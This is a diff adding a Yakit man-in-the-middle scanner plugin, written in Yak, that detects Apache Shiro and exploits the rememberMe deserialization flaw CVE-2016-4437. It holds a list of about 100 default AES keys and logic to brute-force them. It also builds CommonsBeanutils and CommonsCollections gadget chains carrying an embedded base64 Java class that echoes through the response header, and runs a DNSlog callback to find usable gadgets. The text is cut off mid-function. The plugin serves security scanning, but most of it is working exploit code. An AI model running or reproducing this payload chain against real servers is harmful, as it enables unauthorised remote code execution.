@@ -1,0 +1,593 @@
+# mitm plugin template
+
+#--------------------------WORKSPACE-----------------------------
+__test__ = func() {
+    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://192.168.3.113:8085/shiro/")
+    if err != nil {
+        return
+    }
+    isHttps, url, reqRaw, rspRaw, body = results
+
+    mirrorNewWebsite(results...)
+}
+
+// 额外的 key
+extraKeyFileOrText = cli.FileOrContent(
+    "extraKey",
+    cli.setVerboseName("额外密钥"),
+    cli.setHelp("输入或文件中的Key按行分割"),
+    cli.setCliGroup("高级（可选参数）"), 
+)
+
+extraKey = string(extraKeyFileOrText)
+
+mode = cli.StringSlice(
+    "mode", 
+    cli.setRequired(false), 
+    cli.setVerboseName("加密模式"),
+    cli.setDefault("Auto"), 
+    cli.setSelectOption("Auto", "Auto"), 
+    cli.setSelectOption("CBC", "CBC"), 
+    cli.setSelectOption("GCM", "GCM"), 
+    cli.setHelp("加密模式选择,默认Auto,会依次尝试使用CBC、GCM 进行爆破"),
+    cli.setCliGroup("高级（可选参数）"), 
+)
+
+mode = str.Join(mode, " ")
+
+// 关键字
+keyword = cli.String(
+    "keyword", 
+    cli.setRequired(false), 
+    cli.setVerboseName("关键字"),
+    cli.setDefault("rememberMe"),
+    cli.setHelp("关键字选择,默认rememberMe"),
+    cli.setCliGroup("高级（可选参数）"), 
+)
+
+
+// 追加密钥还是覆盖密钥
+keyMode = cli.StringSlice(
+    "keyMode", 
+    cli.setRequired(false), 
+    cli.setVerboseName("密钥模式"),
+    cli.setDefault("追加"), 
+    cli.setSelectOption("覆盖", "cover"), 
+    cli.setSelectOption("追加", "append"), 
+    cli.setHelp("追加密钥时，会追加到插件默认密钥列表的末尾"),
+    cli.setCliGroup("高级（可选参数）"), 
+)
+
+keyMode = str.Join(keyMode," ")
+
+gadgetMode = cli.StringSlice(
+    "gadgetMode", 
+    cli.setRequired(false), 
+    cli.setVerboseName("利用链"),
+    cli.setDefault("Auto"), 
+    cli.setSelectOption("Auto", "Auto"), 
+    cli.setSelectOption("CC192NoCC", "CC192NoCC"), 
+    cli.setSelectOption("CB183NoCC", "CB183NoCC"), 
+    cli.setSelectOption("K1", "K1"), 
+    cli.setSelectOption("K2", "K2"), 
+    cli.setHelp("利用链选择,默认自动选择,会尝试使用CC192NoCC、CB183NoCC、K1、K2 进行尝试"),
+    cli.setCliGroup("高级（可选参数）"), 
+)
+
+gadgetMode = str.Join(gadgetMode, " ")
+
+cli.check()
+
+keys = [
+    "kPH+bIxk5D2deZiIxcaaaA==",
+    "4AvVhmFLUs0KTA3Kprsdag==",
+    "Z3VucwAAAAAAAAAAAAAAAA==",
+    "fCq+/xW488hMTCD+cmJ3aQ==",
+    "0AvVhmFLUs0KTA3Kprsdag==",
+    "1AvVhdsgUs0FSA3SDFAdag==",
+    "1QWLxg+NYmxraMoxAXu/Iw==",
+    "25BsmdYwjnfcWmnhAciDDg==",
+    "2AvVhdsgUs0FSA3SDFAdag==",
+    "3AvVhmFLUs0KTA3Kprsdag==",
+    "3JvYhmBLUs0ETA5Kprsdag==",
+    "r0e3c16IdVkouZgk1TKVMg==",
+    "5aaC5qKm5oqA5pyvAAAAAA==",
+    "5AvVhmFLUs0KTA3Kprsdag==",
+    "6AvVhmFLUs0KTA3Kprsdag==",
+    "6NfXkC7YVCV5DASIrEm1Rg==",
+    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
+    "cmVtZW1iZXJNZQAAAAAAAA==",
+    "7AvVhmFLUs0KTA3Kprsdag==",
+    "8AvVhmFLUs0KTA3Kprsdag==",
+    "8BvVhmFLUs0KTA3Kprsdag==",
+    "9AvVhmFLUs0KTA3Kprsdag==",
+    "OUHYQzxQ/W9e/UjiAGu6rg==",
+    "a3dvbmcAAAAAAAAAAAAAAA==",
+    "aU1pcmFjbGVpTWlyYWNsZQ==",
+    "bWljcm9zAAAAAAAAAAAAAA==",
+    "bWluZS1hc3NldC1rZXk6QQ==",
+    "bXRvbnMAAAAAAAAAAAAAAA==",
+    "ZUdsaGJuSmxibVI2ZHc9PQ==",
+    "wGiHplamyXlVB11UXWol8g==",
+    "U3ByaW5nQmxhZGUAAAAAAA==",
+    "MTIzNDU2Nzg5MGFiY2RlZg==",
+    "L7RioUULEFhRyxM7a2R/Yg==",
+    "a2VlcE9uR29pbmdBbmRGaQ==",
+    "WcfHGU25gNnTxTlmJMeSpw==",
+    "OY//C4rhfwNxCQAQCrQQ1Q==",
+    "5J7bIJIV0LQSN3c9LPitBQ==",
+    "f/SY5TIve5WWzT4aQlABJA==",
+    "bya2HkYo57u6fWh5theAWw==",
+    "WuB+y2gcHRnY2Lg9+Aqmqg==",
+    "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
+    "3qDVdLawoIr1xFd6ietnwg==",
+    "ZWvohmPdUsAWT3=KpPqda",
+    "YI1+nBV//m7ELrIyDHm6DQ==",
+    "6Zm+6I2j5Y+R5aS+5ZOlAA==",
+    "2A2V+RFLUs+eTA3Kpr+dag==",
+    "6ZmI6I2j3Y+R1aSn5BOlAA==",
+    "SkZpbmFsQmxhZGUAAAAAAA==",
+    "2cVtiE83c4lIrELJwKGJUw==",
+    "fsHspZw/92PrS3XrPW+vxw==",
+    "XTx6CKLo/SdSgub+OPHSrw==",
+    "sHdIjUN6tzhl8xZMG3ULCQ==",
+    "O4pdf+7e+mZe8NyxMTPJmQ==",
+    "HWrBltGvEZc14h9VpMvZWw==",
+    "rPNqM6uKFCyaL10AK51UkQ==",
+    "Y1JxNSPXVwMkyvES/kJGeQ==",
+    "lT2UvDUmQwewm6mMoiw4Ig==",
+    "MPdCMZ9urzEA50JDlDYYDg==",
+    "xVmmoltfpb8tTceuT5R7Bw==",
+    "c+3hFGPjbgzGdrC+MHgoRQ==",
+    "ClLk69oNcA3m+s0jIMIkpg==",
+    "Bf7MfkNR0axGGptozrebag==",
+    "1tC/xrDYs8ey+sa3emtiYw==",
+    "ZmFsYWRvLnh5ei5zaGlybw==",
+    "cGhyYWNrY3RmREUhfiMkZA==",
+    "IduElDUpDDXE677ZkhhKnQ==",
+    "yeAAo1E8BOeAYfBlm4NG9Q==",
+    "cGljYXMAAAAAAAAAAAAAAA==",
+    "2itfW92XazYRi5ltW0M2yA==",
+    "XgGkgqGqYrix9lI6vxcrRw==",
+    "ertVhmFLUs0KTA3Kprsdag==",
+    "5AvVhmFLUS0ATA4Kprsdag==",
+    "s0KTA3mFLUprK4AvVhsdag==",
+    "hBlzKg78ajaZuTE0VLzDDg==",
+    "9FvVhtFLUs0KnA3Kprsdyg==",
+    "d2ViUmVtZW1iZXJNZUtleQ==",
+    "yNeUgSzL/CfiWw1GALg6Ag==",
+    "NGk/3cQ6F5/UNPRh8LpMIg==",
+    "4BvVhmFLUs0KTA3Kprsdag==",
+    "MzVeSkYyWTI2OFVLZjRzZg==",
+    "empodDEyMwAAAAAAAAAAAA==",
+    "A7UzJgh1+EWj5oBFi+mSgw==",
+    "YTM0NZomIzI2OTsmIzM0NTueYQ==",
+    "c2hpcm9fYmF0aXMzMgAAAA==",
+    "i45FVt72K2kLgvFrJtoZRw==",
+    "U3BAbW5nQmxhZGUAAAAAAA==",
+    "ZnJlc2h6Y24xMjM0NTY3OA==",
+    "Jt3C93kMR9D5e8QzwfsiMw==",
+    "MTIzNDU2NzgxMjM0NTY3OA==",
+    "vXP33AonIp9bFwGl7aT7rA==",
+    "V2hhdCBUaGUgSGVsbAAAAA==",
+    "Z3h6eWd4enklMjElMjElMjE=",
+    "Q01TX0JGTFlLRVlfMjAxOQ==",
+    "ZAvph3dsQs0FSL3SDFAdag==",
+    "Is9zJ3pzNh2cgTHB4ua3+Q==",
+    "NsZXjXVklWPZwOfkvk6kUA==",
+    "GAevYnznvgNCURavBhCr1w==",
+    "66v1O8keKNV3TTcGPK1wzg==",
+    "SDKOLKn2J1j/2BHjeZwAoQ==",
+]
+
+if keyMode == "cover" {
+    keys = str.ParseStringToLines(extraKey)
+    if len(keys) == 0 {
+        yakit.Error("密钥不能为空")
+        return
+    }
+}else if keyMode =="append" {
+    eks =  str.ParseStringToLines(extraKey)
+    keys = append(keys, eks...)
+}
+
+bruteList = []
+
+if mode == "Auto" {
+    bruteList = [{"name": "aes-cbc", "handle": codec.AESCBCEncrypt},{"name": "aes-gcm", "handle": codec.AESGCMEncrypt}]
+}else if mode == "CBC" {
+    bruteList = [{"name": "aes-cbc", "handle": codec.AESCBCEncrypt}]    
+}else if mode == "GCM" {
+    bruteList = [{"name": "aes-gcm", "handle": codec.AESGCMEncrypt}]
+}
+
+gadgetList = []
+
+if gadgetMode == "Auto" {
+    gadgetList = [
+        {"gadget": "CB183NoCC", "handle": yso.GetCommonsBeanutils183NOCCJavaObject},
+        {"gadget": "CB192NoCC", "handle": yso.GetCommonsBeanutils192NOCCJavaObject},
+        {"gadget": "CCK1", "handle": yso.GetCommonsCollectionsK1JavaObject},
+        {"gadget": "CCK2", "handle": yso.GetCommonsCollectionsK2JavaObject},
+    ]
+}else if gadgetMode == "CC192NoCC" {
+    gadgetList = [{"gadget": "CC192NoCC", "handle": yso.GetCommonsBeanutils192NOCCJavaObject}]
+}else if gadgetMode == "CB183NoCC" {
+    gadgetList = [{"gadget": "CB183NoCC", "handle": yso.GetCommonsBeanutils183NOCCJavaObject}]
+}else if gadgetMode == "K1" {
+    gadgetList = [{"gadget": "K1", "handle": yso.GetCommonsCollectionsK1JavaObject}]
+}else if gadgetMode == "K2" {
+    gadgetList = [{"gadget": "K2", "handle": yso.GetCommonsCollectionsK2JavaObject}]
+}
+
+
+shiroCookieKey = "rememberMe"
+
+if keyword != "" {
+    shiroCookieKey = keyword
+}
+
+
+data = codec.DecodeHex(`aced0005737200326f72672e6170616368652e736869726f2e7375626a6563742e53696d706c655072696e636970616c436f6c6c656374696f6ea87f5825c6a3084a0300014c000f7265616c6d5072696e636970616c7374000f4c6a6176612f7574696c2f4d61703b78707077010078`)[0]
+data = codec.PKCS5Padding(data, 16)
+
+executingCount = 0
+executingCountLock = sync.NewMutex()
+add = func() {
+    executingCountLock.Lock()
+    executingCount += 1
+    yakit_status("正在检测Shiro的网站数量", executingCount)
+    executingCountLock.Unlock()
+}
+sub = func() {
+    executingCountLock.Lock()
+    executingCount -= 1
+    if (executingCount < 1) {
+        yakit_status("正在检测Shiro的网站数量", "")
+    }else{
+        yakit_status("正在检测Shiro的网站数量", executingCount)
+    }
+    executingCountLock.Unlock()
+}
+ctx, cancel = context.WithCancel(context.Background())
+swg = sync.NewSizedWaitGroup(20)
+getRememberMeNumber = (rsp,key)=>{
+    newrsp = str.Replace(rsp,key,"", -1)
+    return (len(rsp)-len(newrsp))/len(key)
+}
+
+EchoSuccessHost = []
+DnsLogSuccessHost = []
+# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
+mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    swg.Add()
+    add()
+    defer sub()
+    defer swg.Done()
+    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))[0]
+    reqHeader, _ = str.SplitHTTPHeadersAndBodyFromPacket(req)
+    host, port, _ = str.ParseStringToHostPort(url)
+    yakit_output(sprintf("准备发送 shiro 探测请求 for: %v", url))
+    rsp, err = freq.FuzzCookie("rememberMe", "{{base64({{randstr(10)}})}};").ExecFirst(httpool.context(ctx), httpool.https(isHttps))
+    if err != nil || rsp.Error != nil {
+        yakit_output(sprintf("执行失败【%v】: %v & %v", url, err, rsp.Error))
+        return
+    }
+    headers, body := str.SplitHTTPHeadersAndBodyFromPacket(rsp.ResponseRaw)
+    // 提取类似rememberMe的key
+    result = re.FindSubmatch(headers, `(?i)(remem?berMe)\s*=\s*deleteMe;?`)
+    if len(result) > 1 {
+        shiroCookieKey = result[1]
+    }
+    // 获取rememberMe的数量
+    currentRememberMeNumber = getRememberMeNumber(headers,shiroCookieKey)
+
+    // currentRememberMeNumber <=0则判断不存在shiro
+    if currentRememberMeNumber <=0 {
+        yakit_output(sprintf("%v 未检测到 shiro", str.HostPort(host, port)))
+        return
+    }
+
+
+
+    yakit_output(sprintf("%v 检测到 shiro, Cookie: %v", str.HostPort(host, port), shiroCookieKey))
+    yakit_status("Shiro:"+str.HostPort(host, port), "Shiro 指纹")
+
+    risk.NewRisk(
+        url,
+        risk.title(sprintf("(Maybe) Shiro(Cookie) Detected: %v", url)),
+        risk.titleVerbose("疑似检测到 Shiro(Cookie) 框架使用"),
+        risk.type("info"), risk.typeVerbose("疑似敏感框架使用"),
+        risk.description(`本条记录是检测疑似 Shiro 框架行为，通过测试 rememberMe / remeberMe 等 Cookie 行为进行判断，并不能准确判断 Shiro 框架，可能存在误报。
+
+如果确认使用了 Shiro 框架，后续测试会使用 Shiro 框架的默认密钥组进行爆破，如果爆破成功，可以进一步检测是否存在 Shiro 反序列化漏洞。
+
+Apache Shiro <= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。该漏洞的根源在于硬编码Key。
+        `),
+        risk.solution("升级到Apache Shiro 1.2.5或更高版本，并配置 'rememberMe' 功能的密钥。"),
+        risk.severity("low"),
+        risk.request(rsp.RequestRaw),
+        risk.response(rsp.ResponseRaw),
+        risk.details({"cookie_name": shiroCookieKey}),
+    )
+
+    yakit_output("开始爆破 Shiro Weak Key")
+    cookie = make([]var)
+
+    for _, key := range keys {
+        for _, encItem = range bruteList {
+            enc = encItem.handle
+            keyDecoded,err = codec.DecodeBase64(key)
+            if err{
+                continue
+            }
+            iv = []byte(randstr(16))
+            result,err = enc(keyDecoded, data, iv)
+            if err{
+                continue
+            }
+            if result == nil {
+                continue
+            }
+
+            if encItem.name == "aes-gcm" {
+                result,err = enc(keyDecoded, data, nil)
+                if err{
+                    continue
+                }
+                if result == nil {
+                    continue
+                }
+                cookie = append(cookie, {
+                    "cookie": codec.EncodeBase64(append(result)),
+                    "key": key,
+                    "aes-mode": encItem.name,
+                })
+            }else{
+                cookie = append(cookie, {
+                    "cookie": codec.EncodeBase64(append(iv, result...)),
+                    "key": key,
+                    "aes-mode": encItem.name,
+                })
+            }
+
+        }
+    }
+
+
+
+    for _, cookieElement := range cookie {
+        yakit_output(sprintf("Shiro Try KEY: %v for %v", cookieElement["key"], url))
+
+        result = freq.FuzzCookie(shiroCookieKey, cookieElement["cookie"]).ExecFirst(httpool.https(isHttps))[0]
+
+        if result == nil||result.Error != nil {
+            yakit_output("FAILED for %v=%v", shiroCookieKey, cookieElement["cookie"])
+            continue
+        }
+        headers, _ = str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)
+
+        if headers == "" {
+            continue
+        }
+
+        // 如果RememberMe数量减少，则判断测试成功
+        if getRememberMeNumber(headers,shiroCookieKey) < currentRememberMeNumber{
+            vulInfo =  "CVE-2016-4437"
+            if cookieElement["aes-mode"] == "aes-gcm" {
+                vulInfo = ""
+            }
+            detail := {
+                "shiro_cookie_key": shiroCookieKey,
+                "payload": cookieElement["cookie"],
+                "shiro_key": cookieElement["key"],
+                "shiro_aes_mode": cookieElement["aes-mode"],
+                "request": result.RequestRaw,
+                "response": result.ResponseRaw,
+            }
+
+            risk.NewRisk(
+                    url,
+                    risk.severity("critical"),
+                    risk.title(sprintf("%v(Shiro Default Key): %v",vulInfo, url)),
+                    risk.description("Apache Shiro <= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。该漏洞的根源在于硬编码Key。"),
+                    risk.solution("升级到Apache Shiro 1.2.5或更高版本，并配置 'rememberMe' 功能的密钥。"),
+                    risk.titleVerbose(sprintf("%v(Shiro 默认 KEY)：%v", vulInfo,url)),
+                    risk.type("rce"),
+                    risk.parameter("Key: "+cookieElement["key"]),
+                    risk.payload(cookieElement["cookie"]),
+                    risk.details(detail),
+                )
+            delete(detail, "request")
+            delete(detail, "response")
+
+            yakit_output(detail)
+            // 开始盲打 使用 CB183NoCC、CC192NoCC、K1、K2
+            blind = blindEcho(cookieElement["key"],cookieElement["aes-mode"],shiroCookieKey,freq,isHttps)
+
+            if blind {
+                return
+            }
+
+            yakit.Info("%v echo %v dnslog %v",url, EchoSuccessHost.Length(),DnsLogSuccessHost.Length())
+
+            if EchoSuccessHost.Length() == 0  && DnsLogSuccessHost.Length() == 0 {
+                server,token,err = risk.NewDNSLogDomain()
+                if err == nil {
+                    try {
+
+                        findGadgetData = yso.GetFindGadgetByDNSJavaObject(server)~
+                        findGadgetDataBytes = yso.ToBytes(findGadgetData)~
+                        findGadgetDataBytes = codec.PKCS5Padding(findGadgetDataBytes, 16)
+                        keyDecoded,_ = codec.DecodeBase64(cookieElement["key"])
+                        payload = ""
+                        if cookieElement["aes-mode"] == "aes-gcm" {
+                            enD,_ = codec.AESGCMEncrypt(keyDecoded, findGadgetDataBytes, nil)
+                            payload =  codec.EncodeBase64(append(enD))
+                        }else{
+                            iv = []byte(randstr(16))
+                            enD,_ = codec.AESCBCEncrypt(keyDecoded, findGadgetDataBytes, iv)
+                            payload =  codec.EncodeBase64(append(iv, enD...))
+                        }
+                        res = freq.FuzzCookie(shiroCookieKey, payload).ExecFirst(httpool.https(isHttps))[0]
+
+                        findGadGetDetail := {
+                            "shiro_cookie_key": shiroCookieKey,
+                            "payload": payload,
+                            "shiro_key": cookieElement["key"],
+                            "shiro_aes_mode": cookieElement["aes-mode"],
+                            "request": res.RequestRaw,
+                            "response": res.ResponseRaw,
+                            "gadgets": "",
+                        }
+                        tokens,_ = risk.CheckDNSLogByToken(token)
+                        gadgets = make([]string)
+                        for _,v := range tokens{
+                            domain = str.ToLower(v.Domain)
+                            if str.Contains(domain,"."+token) {
+                                gadgets = append(gadgets, str.Split(domain,"." + token)[0])
+                            }
+                        }
+                        gadgets = str.RemoveRepeat(gadgets)
+
+                        if gadgets.Length() > 0 {
+                            DnsLogSuccessHost.Append(str.ParseStringUrlToUrlInstance(url)~.Host)
+                            gadgetStr = str.Join(gadgets, ",")
+                            findGadGetDetail.Set("gadgets",gadgetStr)
+                            risk.NewRisk(
+                                url,
+                                risk.severity("critical"),
+                                risk.title(sprintf("%v(Shiro FindGadgets): %v",vulInfo, url)),
+                                risk.description("Apache Shiro <= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。该漏洞的根源在于硬编码Key。"),
+                                risk.solution("升级到Apache Shiro 1.2.5或更高版本，并配置 'rememberMe' 功能的密钥。"),
+                                risk.titleVerbose(sprintf("%v(Shiro 探测可利用链)：%v", vulInfo,url)),
+                                risk.type("rce"),
+                                risk.parameter("Key: "+cookieElement["key"]+" 可能的利用链: " + findGadGetDetail["gadgets"]),
+                                risk.payload(cookieElement["cookie"]),
+                                risk.details(findGadGetDetail),
+                            )
+                            delete(findGadGetDetail, "request")
+                            delete(findGadGetDetail, "response")
+                        }
+                    } catch err {
+                        yakit.Info("GetFindGadgetByDNS %v", err)
+                    }
+                }
+            }
+
+
+            return
+        }
+    }
+}
+
+blindEcho = func (bs64key,mode,shiroCookieKey,freq,isHttps) {
+    bytesCode,err =codec.DecodeBase64("yv66vgAAADIAlQoAAgBEBwBFCgBGAEcHAEgKAEYASQoABABKCgBLAEwKAEsATQoAKQBOCgBPAFAKAE8AUQgAUgoAKABTBwBUCgBPAFUIAFYKAFcAWAgAWQgAWgcAWwgAXAgAXQgAXgcAXwgAYAcAYQsAGgBiCwAaAGMIAGQHAGUKAB4AZgcAZwoAIABoCgAgAGkJACgAaggAawoAVwBsCgBtAG4IAG8HAHAHAHEBAApFY2hvSGVhZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwByBwBzBwBIAQAKRXhjZXB0aW9ucwEABjxpbml0PgEAAygpVgcAcAcAdAcARQcAdQcAXwcAYQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAdgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAdNTC5qYXZhDAB3AHgBABBqYXZhL2xhbmcvT2JqZWN0BwBzDAB5AHoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAHsAeAwANQB8BwByDAB9AH4MAH8AgAwANQA2BwB0DACBAIIMAIMAhAEAB3RocmVhZHMMACwALQEAE1tMamF2YS9sYW5nL1RocmVhZDsMAIUAhgEABGV4ZWMHAHUMAIcAiAEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwAiQCKDAB/AIsBAANyZXEBABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0DACMAIsBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0DACNAIYMAI4AjwwAKgArAQACXHwMAJAAkQcAkgwAkwCUAQAPRXRhZ3wzMTQ3NTI2OTQ3AQACTUwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvVGhyZWFkAQAQamF2YS9sYW5nL1N0cmluZwEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5vdGUBAA1nZXRSZXF1ZXN0VVJJAQALZ2V0UmVzcG9uc2UBACooKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJc2V0SGVhZGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWACEAKAApAAAAAQAJACoAKwAAAAUACgAsAC0AAgAuAAAAmwADAAUAAAA4AU0qtgABTi0SAqUAFi0rtgADTacADToELbYABU6n/+osxwAMuwAEWSu3AAa/LAS2AAcsKrYACLAAAQANABMAFgAEAAIALwAAADIADAAAAAsAAgAMAAcADQANAA8AEwAQABYAEQAYABIAHQATACAAFQAkABYALQAYADIAGQAwAAAAEQAE/QAHBwAxBwAyTgcAMwkMADQAAAAEAAEAGAABADUANgACAC4AAAIBAAMADgAAAQAqtwAJAz64AAq2AAsSDLgADcAADsAADjoEAzYFFQUZBL6iAN4ZBBUFMjoGGQbHAAanAMkZBrYAD00sEhC2ABGaALosEhK2ABGZALEZBhITuAANTCvBABSaAAanAJ8rEhW4AA0SFrgADRIXuAANTKcACDoHpwCGKxIZuAANwAAaOgcDNggVCBkHuQAbAQCiAGUZBxUIuQAcAgA6CRkJEh24AA1MK8AAHgS2AB/AACDAACA6ChkKtgAhxgA0GQq2ACI6C7IAIxIktgAlAzI6DLIAIxIktgAlBDI6DRkLGQwZDbYAJgQ+HZkABqcACYQIAaf/lR2ZAAanAAmEBQGn/yCxAAEAXQBuAHEAGAACAC8AAACKACIAAAAcAAQAHwAGACAAGQAhACQAIgArACMAMAAkADMAJgA5ACcASwAoAFMAKQBaACoAXQAuAG4AMQBxAC8AcwAwAHYAMwCBADQAkAA1AJsANgCjADcAswA4ALsAOQDCADoAzgA7ANoAPADjAD0A5QA/AOkAQADsADQA8gBEAPYARQD5ACEA/wBJADAAAABXAAr/ABwABgcANwAAAQcADgEAAPwAFgcAOP8AKQAHBwA3BwA5BwA6AQcADgEHADgAAFMHADsE/QANBwA8AfsAZ/oABf8ABgAGBwA3AAABBwAOAQAA+gAFADQAAAAEAAEAGAABAD0APgACAC4AAAAZAAAAAwAAAAGxAAAAAQAvAAAABgABAAAATAA0AAAABAABAD8AAQA9AEAAAgAuAAAAGQAAAAQAAAABsQAAAAEALwAAAAYAAQAAAE8ANAAAAAQAAQA/AAgAQQA2AAEALgAAAB4AAQAAAAAABhInswAjsQAAAAEALwAAAAYAAQAAAAgAAQBCAAAAAgBD")
+    if err != nil {
+        yakit.Error(err.Error())
+        return
+    }
+    echoKey = randstr(6)
+    echoValue = randstr(8)
+    reqValue = echoKey + "|" + echoValue
+    payloadObj , err = yso.LoadClassFromBytes(bytesCode)
+    if err {
+        yakit.Error("load header echo class failed %v",err)
+        return
+    }
+    flag := payloadObj.FindConstStringFromPool("Etag|3147526947")
+    if flag != nil {
+        flag.Value = reqValue
+    }
+    fixPayload,err = yso.ToBytes(payloadObj)
+    if err {
+        yakit.Error("yso.ToBytes %v",err)
+        return false
+    }
+    keyDecoded,err = codec.DecodeBase64(bs64key) // 生成key
+    if err{
+       yakit.Error("DecodeBase64 %v",err)
+       return false
+    }
+    for _, gadgetItem = range gadgetList {
+            yakit.Info("gadget %v", gadgetItem.gadget)
+
+            className = randstr(8)
+
+            genGadget = gadgetItem.handle
+
+            gadgetObj,err = genGadget(yso.useBytesEvilClass(fixPayload),yso.obfuscationClassConstantPool(),yso.evilClassName(className))
+            if err {
+                yakit.Error("%v",err)
+                continue
+            }
+            gadgetBytes,err = yso.ToBytes(gadgetObj)
+            if err {
+                yakit.Error("%v",err)
+                continue
+            }
+            payload = ""
+            vulInfo =  "CVE-2016-4437"
+            payloadPadding = codec.PKCS5Padding(gadgetBytes, 16)
+
+            if mode == "aes-gcm" {
+                vulInfo = ""
+                encodePayload,err = codec.AESGCMEncrypt(keyDecoded, payloadPadding, nil)
+                if err{
+                    continue
+                }
+                if encodePayload ==nil{
+                    continue
+                }
+                payload = codec.EncodeBase64(append(encodePayload))
+            }else{
+                iv = []byte(randstr(16))
+                encodePayload,err = codec.AESCBCEncrypt(keyDecoded, payloadPadding, iv)
+                if err{
+                    continue
+                }
+                if encodePayload ==nil{
+                    continue
+                }
+                payload = codec.EncodeBase64(append(iv, encodePayload...))
+            }
+
+
+            res = freq.FuzzCookie(shiroCookieKey, payload).ExecFirst(httpool.https(isHttps))[0]
+            headers, _ = str.SplitHTTPHeadersAndBodyFromPacket(res.ResponseRaw)
+            if headers == "" {
+                continue
+            }
+            if str.Contains(str.ToLower(headers),str.ToLower(echoKey)) && str.Contains(str.ToLower(headers),str.ToLower(echoValue)) {
+               blindDetail := {
+                    "shiro_cookie_key": shiroCookieKey,
+                    "payload": payload,
+                    "shiro_key": bs64key,
+                    "shiro_aes_mode": mode,
+                    "request": res.RequestRaw,
+                    "response": res.ResponseRaw,
+                    "gadgets": gadgetItem.gadget,
+                }
+                risk.NewRisk(
+                    res.Url,
+                    risk.severity("critical"),
+                    risk.title(sprintf("%v(Shiro RCE): %v",vulInfo,  res.Url)),
